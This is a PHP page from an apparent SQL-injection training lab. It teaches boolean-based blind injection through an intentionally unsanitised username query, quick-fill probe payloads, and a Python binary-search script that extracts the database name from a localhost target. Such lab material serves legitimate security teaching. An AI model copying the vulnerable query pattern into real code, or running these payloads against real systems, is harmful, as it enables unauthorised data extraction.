<?php
/**
 * Pikachu-Enhanced v2.0 - 基于布尔的盲注 (Boolean-based Blind SQLi) 教学演练
 */
$PIKA_ROOT_DIR = "../../";
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[35] = 'active open';
$ACTIVE[44] = 'active';
include_once $PIKA_ROOT_DIR . 'header.php';
include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";

$link = connect();
$html = '';
$user_name = $_GET['name'] ?? '';

if (isset($_GET['submit']) && $user_name !== '') {
    // 【核心漏洞点】：布尔盲注无数据和错误回显，仅通过返回“您输入的username存在”或“您输入的username不存在”两种状态反馈布尔真假
    $query = "select * from users where username='$user_name'";
    $result = @mysqli_query($link, $query);
    
    if ($result && mysqli_num_rows($result) >= 1) {
        $html = "<div class='alert alert-success' style='margin:0; border-radius:8px; font-weight:700;'>
            <i class='fa fa-check-circle'></i> [TRUE] 您输入的 username 存在，查询结果为真！
        </div>";
    } else {
        $html = "<div class='alert alert-warning' style='margin:0; border-radius:8px; font-weight:700;'>
            <i class='fa fa-times-circle'></i> [FALSE] 您输入的 username 不存在，查询结果为假。
        </div>";
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="sqli.php">SQL Injection</a></li>
                <li class="active">布尔盲注 (Boolean-based Blind)</li>
            </ul>
            <a href="#" class="tips-btn" data-container="body" data-toggle="popover" data-placement="bottom" title="💡 布尔盲注判定函数" data-content="使用 ascii(substr(database(),1,1))>97 或 length(database())>5 逐位猜测数据库名称与字符！">
                <i class="fa fa-lightbulb-o"></i> 攻防提示
            </a>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        ⚖️ 8. 布尔盲注漏洞攻防教学 (Boolean-based Blind SQLi)
                        <span class="cyber-badge-chip">SQLi · 逐字探测 · 二分算法 · 200 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        在许多实际 Web 应用中，页面并不会直接把数据库查询到的行数据显示在前端，也不显示任何 SQL 报错，但会根据 SQL 执行结果是否命中数据而展示<b>完全不同的页面状态（例如：“用户名存在” vs “用户名不存在”）</b>。攻击者利用 <code>AND ascii(substr(database(), 1, 1)) > 100</code> 等逻辑表达式，通过二分法逐字符猜解数据库中的全部数据！
                    </p>
                </div>

                <div class="row">
                    <!-- Left: Probe Form -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-filter" style="color:var(--primary);"></i> 账号存在性布尔探测端
                            </h4>

                            <form method="GET" action="sqli_blind_b.php">
                                <div class="form-group" style="margin-bottom:12px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">输入用户名或布尔探测 Payload：</label>
                                    <div class="input-group">
                                        <input class="form-control" type="text" id="name_input" name="name" value="<?php echo htmlspecialchars($user_name); ?>" placeholder="输入用户名..." style="font-family:monospace;" required />
                                        <span class="input-group-btn">
                                            <button class="btn btn-primary" type="submit" name="submit" value="submit" style="font-weight:700;">
                                                <i class="fa fa-play"></i> 探测真假
                                            </button>
                                        </span>
                                    </div>
                                </div>

                                <div style="margin-bottom:16px;">
                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
                                        ⚡ 快速测试布尔探测载荷：
                                    </label>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince\' and 1=1 #')">
                                            <i class="fa fa-check" style="color:#10b981;"></i> <b>真值基准：</b> <code>vince' and 1=1 #</code> (预期 TRUE)
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince\' and 1=2 #')">
                                            <i class="fa fa-times" style="color:#ef4444;"></i> <b>假值基准：</b> <code>vince' and 1=2 #</code> (预期 FALSE)
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince\' and length(database())>5 #')">
                                            <i class="fa fa-database" style="color:#06b6d4;"></i> <b>库名长度：</b> <code>vince' and length(database())>5 #</code>
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillInput('vince\' and ascii(substr(database(),1,1))=112 #')">
                                            <i class="fa fa-code" style="color:#8b5cf6;"></i> <b>首字母探测：</b> <code>and ascii(substr(database(),1,1))=112 #</code> ('p')
                                        </button>
                                    </div>
                                </div>
                            </form>

                            <hr style="border-color:var(--border-color); margin:16px 0;" />
                            <h4 style="margin:0 0 10px 0; color:var(--text-primary); font-weight:800; font-size:14px;">
                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> 响应状态反馈
                            </h4>
                            <?php if (!empty($html)): echo $html; else: ?>
                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:18px; text-align:center; color:var(--text-muted); font-size:13px;">
                                    <i class="fa fa-info-circle"></i> 请在上方选择或输入 Payload 探测服务端真假响应
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>

                    <!-- Right Column: Python Auto-Exploit Snippet -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-terminal" style="color:#10b981;"></i> Python 二分法自动化提取脚本原理
                            </h4>

                            <pre style="background:#090d16; color:#a5b4fc; border:1px solid #1e293b; border-radius:8px; padding:14px; font-family:'Fira Code', monospace; font-size:11.5px; line-height:1.6; max-height:260px; overflow-y:auto;">import requests

url = "http://127.0.0.1:8765/vul/sqli/sqli_blind_b.php"
db_name = ""

for i in range(1, 10):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"vince' and ascii(substr(database(),{i},1))>{mid} #"
        r = requests.get(url, params={"name": payload, "submit": "submit"})
        if "存在" in r.text:
            low = mid + 1
        else:
            high = mid - 1
    if low > 32:
        db_name += chr(low)
print(f"[+] Current Database: {db_name}")</pre>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="sqli_del.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：删除型 / 报错注入</a>
                    <a href="sqli_blind_t.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：时间盲注 <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function fillInput(val) {
    document.getElementById('name_input').value = val;
    document.forms[0].submit();
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
